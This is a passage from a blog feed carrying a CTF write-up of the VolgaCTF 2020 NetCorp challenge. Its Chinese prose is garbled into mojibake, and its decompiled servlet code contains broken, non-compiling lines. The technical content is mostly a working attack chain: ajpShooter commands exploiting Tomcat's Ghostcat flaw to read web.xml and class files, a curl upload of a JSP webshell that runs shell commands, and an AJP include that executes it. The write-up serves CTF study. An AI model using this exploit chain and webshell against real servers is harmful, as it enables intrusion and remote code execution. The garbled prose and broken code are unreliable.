ä¸èƒ½æ€»æ˜¯å¾…åœ¨èˆ’é€‚åŒºã€‚å›½é™…èµ›ä¹Ÿå¥½ï¼Œhtbé¶æœºæ¸—é€ä¹Ÿå¥½ï¼Œéƒ½æ˜¯æ¥è§¦éå›½å†…æ¸—é€çŸ¥è¯†çš„å¤§å¥½é€”å¾„ã€‚æ¯•ç«Ÿä¹Ÿæ‰“äº†ä¸€æ®µæ—¶é—´æ¯”èµ›äº†ï¼Œå›½å†…çš„æ¯”èµ›é™¤äº†å¤§å‹æ¯”èµ›èƒ½æœ‰å¾ˆå¤šæ–°å§¿åŠ¿ä»¥åŠæ–°æƒ³æ³•å­¦ä»¥å¤–ï¼Œå…¶ä»–çš„å‡ºé¢˜æ€è·¯æˆ–è€…èµ›äº‹æ“ä½œéƒ½æ˜¯è€ç”Ÿå¸¸è°ˆï¼Œæ‹˜æ³¥äºphpæˆ–è€…ä¸ªåˆ«trickçš„æ³¥æ½­ä¸­ã€‚è¿™å‡ å¤©å°è¯•äº†javaé¢˜ï¼Œwindowsé¢˜ï¼Œéƒ½ç®—æ˜¯ä¸€ç§çªç ´å¸¸è§„çš„å°è¯•å§ã€‚å¸Œæœ›è‡ªå·±ä¹Ÿèƒ½æˆä¸ºæœ‰æƒ³æ³•çš„CTFerã€‚è€Œä¸æ˜¯ä¸€ä¸ªå•çº¯çš„CTFèµ›æ£.</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VolgaCTF2020Qualifierå¤ç°</title>
      <link href="2020/03/30/VolgaCTF2020Qualifier%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/03/30/VolgaCTF2020Qualifier%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>æ¯”èµ›æ²¡æœ‰æ€ä¹ˆè®¤çœŸæ‰“ï¼Œä½†æ˜¯æ¯•ç«Ÿé¢˜è¿˜æ˜¯çœ‹äº†çš„ã€‚é™¤äº†å¹½çµçŒ«ä»¥å¤–çš„é¢˜ä¹Ÿæ˜¯å¾ˆæœ‰ä»·å€¼çš„ï¼Œå¥½å¥½å­¦ä¹ ä¸€æ³¢ã€‚</p><h2 id="NetCorp"><a href="#NetCorp" class="headerlink" title="NetCorp"></a>NetCorp</h2><p>è¿™ä¸ªå‘¨æœ«æœ€å¤§çš„æ”¶è·å°±æ˜¯åšäº†å‡ é“javaé¢˜ï¼Œå¯¹javaé¢˜çš„ç›¸å…³å¥—è·¯æœ‰äº†ä¸€å®šäº†è§£ã€‚<br>æ¯”å¦‚æ­¤é¢˜ï¼Œå¼€å§‹ä¸Šæ¥é¡µé¢å¹¶æ— ä»»ä½•æœ‰ç”¨ä¿¡æ¯ã€‚å”¯ä¸€èƒ½åšçš„ä»è·¯ç”±ä¸‹æ‰‹ï¼Œè¿™é‡Œä¸ä½¿ç”¨è·¯å¾„çˆ†ç ´å·¥å…·çš„è¯ï¼Œå¯ä»¥é€šè¿‡æ„é€ ä¸€äº›é”™è¯¯è·¯å¾„æ¥å°è¯•çˆ†ç‰ˆæœ¬ä»¥åŠçˆ†æœåŠ¡ã€‚è¿™é‡Œåœ¨bpé€šè¿‡æ„é€ çˆ†å‡ºäº†tomcatæœåŠ¡çš„ç›¸å…³ä¿¡æ¯ã€‚</p><a id="more"></a><p>è€Œä¸”è®¿é—®<code>/docs</code>ï¼Œå¾—åˆ°apachetomcatä¿¡æ¯,æ˜¯9.0.24ç‰ˆæœ¬ã€‚åŸºæœ¬ç¡®å®šæ˜¯é“javaé¢˜ï¼Œ<br><img src="https://upload-images.jianshu.io/upload_images/18060177-8d3efb32888760dd.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-8d3efb32888760dd.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å»æœç´¢ç›¸å…³ä¿¡æ¯ï¼Œå‘ç°äº†è¿™æ ·ä¸€ä¸ªæ¼æ´ï¼š<br>CVE-2020-1938 å³tomcatçš„ghostcatæ¼æ´<br>å€¼å¾—ä¸€æçš„æ˜¯,ghostcatæ¼æ´æ˜¯ç”±é•¿äº­çˆ†å‡ºæ¥çš„æ´ï¼ŒGhostCat ä¸»è¦æ˜¯å­˜åœ¨æ–‡ä»¶è¯»å–å’ŒåŒ…å«æ¼æ´<br>å½±å“èŒƒå›´å¾ˆå¹¿ï¼Œå‡ ä¹å›Šæ‹¬äº†6-9ç‰ˆæœ¬ã€‚<br>æˆ‘ä»¬åˆçŸ¥é“ï¼Œæ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«=RCE.å› æ­¤å°è¯•åˆ©ç”¨ç›¸å…³å·¥å…·å…ˆè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œçœ‹çœ‹æœ‰æ— æ”¶è·ã€‚<br>å¼€å§‹ç”¨çš„expæ˜¯è¿™ä¸ª<br><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a>,ä½†æ˜¯åªèƒ½è¯»æ–‡ä»¶ä¸å¯æ‰§è¡Œå‘½ä»¤ã€‚å› æ­¤ä½œç½¢ã€‚<br>æˆ‘åæ¥ä½¿ç”¨çš„expæ¥è‡ª<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a><br>è¿™ä¸ªexpä¸ä»…å¯ä»¥æ–‡ä»¶è¯»å–è¿˜å¯ä»¥åŒ…å«ï¼Œå› æ­¤æ›´é€‚åˆ</p><p>é¦–å…ˆ,å¯¹tomcatæœåŠ¡å¿…è¯»çš„æ–‡ä»¶å°±æ˜¯<code>WEB-INF/web.xml</code><br>å°è¯•è¯»å–<br><code>python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru  8009  /WEB-INF/web.xml read</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>NetCorp<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>ru.volgactf.netcorp.ServeScreenshotServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeScreenshot<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ServeScreenshot<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">description</span>&gt;</span>Complaint info<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>ru.volgactf.netcorp.ServeComplaintServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServeComplaint<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ServeComplaint<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é™¤äº†404.htmlè¿™æ ·çš„é¡µé¢è¿˜æœ‰ä¸¤ä¸ªç±»çš„ä¿¡æ¯ã€‚è¿™é‡Œå¯ä»¥æ¨æ–­classæ–‡ä»¶çš„è·¯å¾„,é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç <br>æˆ‘æŒ‰ç…§roarctf easyjavaçš„ç»éªŒæ„é€ è·¯å¾„,è·¯å¾„å‹‰å¼ºç®—ç†è§£ï¼Œå¥½æ­¹æˆ‘ä¹Ÿæ˜¯javaå…¥é—¨ç¼–ç¨‹çš„â€¦<code>WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.class</code>ï¼Œå¦ä¸€ä¸ªåŒç†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http:&#x2F;&#x2F;netcorp.q.2020.volgactf.ru:7782 8009 &#x2F;WEB-INF&#x2F;classes&#x2F;ru&#x2F;volgactf&#x2F;netcorp&#x2F;ServeComplaintServlet.class read -o complaint.class</span><br><span class="line">python3 ajpShooter.py http:&#x2F;&#x2F;netcorp.q.2020.volgactf.ru:7782 8009 &#x2F;WEB-INF&#x2F;classes&#x2F;ru&#x2F;volgactf&#x2F;netcorp&#x2F;ServeScreenshotServlet.class read -o screenshoot.class</span><br></pre></td></tr></table></figure><p>åç¼–è¯‘åå¾—åˆ°ä»¥ä¸‹æºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://www.geocities.com/kpdus/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) </span></span><br><span class="line"><span class="comment">// Source File Name:   ServeComplaintServlet.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> ru.volgactf.netcorp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServeComplaintServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServeComplaintServlet</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet Constructor called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Init\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Destroy\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SAVE_DIR = <span class="string">"uploads"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://www.geocities.com/kpdus/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) </span></span><br><span class="line"><span class="comment">// Source File Name:   ServeScreenshotServlet.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> ru.volgactf.netcorp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServeScreenshotServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServeScreenshotServlet</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet Constructor called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Init\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"ServeScreenshotServlet \"Destroy\" method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String appPath = request.getServletContext().getRealPath(<span class="string">""</span>);</span><br><span class="line">        String savePath = (<span class="keyword">new</span> StringBuilder()).append(appPath).append(<span class="string">"uploads"</span>).toString();</span><br><span class="line">        File fileSaveDir = <span class="keyword">new</span> File(savePath);</span><br><span class="line">        <span class="keyword">if</span>(!fileSaveDir.exists())</span><br><span class="line">            fileSaveDir.mkdir();</span><br><span class="line">        String submut = request.getParameter(<span class="string">"submit"</span>);</span><br><span class="line">        <span class="keyword">if</span>(submut != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">if</span>(submut.equals(<span class="string">"true"</span>));</span><br><span class="line">        PrintWriter out = request.getParts().iterator();</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!out.hasNext())</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            Part part = (Part)out.next();</span><br><span class="line">            String fileName = extractFileName(part);</span><br><span class="line">            fileName = (<span class="keyword">new</span> File(fileName)).getName();</span><br><span class="line">            String hashedFileName = generateFileName(fileName);</span><br><span class="line">            String path = (<span class="keyword">new</span> StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString();</span><br><span class="line">            <span class="keyword">if</span>(!path.equals(<span class="string">"Error"</span>))</span><br><span class="line">                part.write(path);</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="keyword">true</span>);</span><br><span class="line">        out = response.getWriter();</span><br><span class="line">        response.setContentType(<span class="string">"application/json"</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">        out.print(String.format(<span class="string">"&#123;'success':'%s'&#125;"</span>, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="string">"true"</span></span><br><span class="line">        &#125;));</span><br><span class="line">        out.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">generateFileName</span><span class="params">(String fileName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String s2;</span><br><span class="line">        StringBuilder sb;</span><br><span class="line">        MessageDigest md = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">        md.update(fileName.getBytes());</span><br><span class="line">        <span class="keyword">byte</span> digest[] = md.digest();</span><br><span class="line">        s2 = (<span class="keyword">new</span> BigInteger(<span class="number">1</span>, digest)).toString(<span class="number">16</span>);</span><br><span class="line">        sb = <span class="keyword">new</span> StringBuilder(<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> count = <span class="number">32</span> - s2.length(); i &lt; count; i++)</span><br><span class="line">            sb.append(<span class="string">"0"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.append(s2).toString();</span><br><span class="line">        NoSuchAlgorithmException e;</span><br><span class="line">        e;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">extractFileName</span><span class="params">(Part part)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String contentDisp = part.getHeader(<span class="string">"content-disposition"</span>);</span><br><span class="line">        String items[] = contentDisp.split(<span class="string">";"</span>);</span><br><span class="line">        String as[] = items;</span><br><span class="line">        <span class="keyword">int</span> i = as.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            String s = as[j];</span><br><span class="line">            <span class="keyword">if</span>(s.trim().startsWith(<span class="string">"filename"</span>))</span><br><span class="line">                <span class="keyword">return</span> s.substring(s.indexOf(<span class="string">"="</span>) + <span class="number">2</span>, s.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SAVE_DIR = <span class="string">"uploads"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦å†…å®¹åœ¨äº<code>ServeScreenshotServlet</code>è¿™ä¸ªç±»ã€‚æˆ‘ä»¬å¾—åˆ°äº†ä¸Šä¼ æ–‡ä»¶çš„å­˜åœ¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡ä¸Šä¼ +åŒ…å«æ„é€ RCEäº†ã€‚<br>ç®€å•è¯»ä¸‹æºç ï¼Œå…¶å®å°±æ˜¯æŒ‡ä¸Šä¼ æ–‡ä»¶ä¼šä¼ åˆ°<code>/upload</code>ä¸‹ï¼ŒåŒæ—¶æ–‡ä»¶åå˜ä¸ºä¸Šä¼ æ–‡ä»¶åçš„md5å€¼<br>ç›´æ¥ä½¿ç”¨curlä¼ æ–‡ä»¶<br><code>curl -vv -F &quot;data=@myexp.jsp&quot; http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshot</code><br>myexp.jsp</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(<span class="string">"Executing command"</span>);</span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="string">"ls"</span>);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream <span class="keyword">in</span> = p.getInputStream();</span><br><span class="line">DataInputStream dis = <span class="keyword">new</span> DataInputStream(<span class="keyword">in</span>);</span><br><span class="line"><span class="built_in">String</span> disr = dis.readLine();</span><br><span class="line"><span class="keyword">while</span> ( disr != <span class="literal">null</span> ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr = dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ<br><code>python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru 8009 /uploads/78e1e40f057500a0dd0209effb7514d3 eval</code><br><img src="https://upload-images.jianshu.io/upload_images/18060177-b021125c76dc7d52.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-b021125c76dc7d52.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ³¨æ„åˆ°flag.txtçš„å­˜åœ¨,é‚£ä¹ˆç›´è§£æ›´æ”¹å‘½ä»¤ä¸Šä¼ åå†æ¬¡æ‰§è¡Œå³å¯</p><p><img 